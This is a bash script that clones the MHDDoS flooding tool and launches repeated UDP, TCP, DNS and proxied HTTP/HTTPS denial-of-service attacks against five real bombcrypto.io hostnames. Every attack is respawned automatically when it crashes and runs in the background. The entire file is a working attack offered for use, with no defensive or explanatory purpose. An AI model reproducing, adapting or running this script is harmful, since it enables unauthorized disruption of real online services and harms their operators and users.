#!/bin/bash

declare -a arr=\
(
"server.bombcrypto.io" 
"app.bombcrypto.io" 
"bombcrypto.io" 
"market.bombcrypto.io" 
"report.bombcrypto.io"
)

# sudo apt update
# sudo apt upgrade -y
[[ $(dpkg -l git) ]] || sudo apt install git -y
[[ $(dpkg -l wget) ]] || sudo apt install wget -y
[[ $(dpkg -l python) ]] || sudo apt install python -y 
[[ $(dpkg -l python3-pip) ]] || sudo apt install python3-pip -y
[[ $(dpkg -l syslinux-utils) ]] || sudo apt install syslinux-utils -y

[[ -d MHDDoS ]] || git clone https://github.com/MHProDev/MHDDoS.git || exit 1
[[ -d MHDDoS ]] && sudo pip3 install -r ./MHDDoS/requirements.txt || exit 1

for i in "${arr[@]}"
do		 
until eval "$(cd MHDDoS/ && sudo python3 start.py udp "$(gethostip -d "$i")" 5 100)"; do echo "$i udp attack crashed with exit code $?. Respawning" ; sleep 1 ; done &                    
until eval "$(cd MHDDoS/ && sudo python3 start.py tcp "$(gethostip -d "$i")" 5 100)"; do echo "$i tcp attack crashed with exit code $?. Respawning" ; sleep 1 ; done &                     
until eval "$(cd MHDDoS/ && sudo python3 start.py dns "$(gethostip -d "$i")" 5 100 dns.txt)"; do echo "$i dns attack crashed with exit code $?. Respawning" ; sleep 1 ; done &             
until eval "$(cd MHDDoS/ && sudo python3 start.py bypass "https://$i" 5 500 socks5.txt 100 100)"; do echo "$i bypass attack crashed with exit code $?. Respawning" ; sleep 1 ; done &     
until eval "$(cd MHDDoS/ && sudo python3 start.py bypass "http://$i" 5 500 socks5.txt 100 100)"; do echo "$i bypass attack crashed with exit code $?. Respawning" ; sleep 1 ; done  &    
done
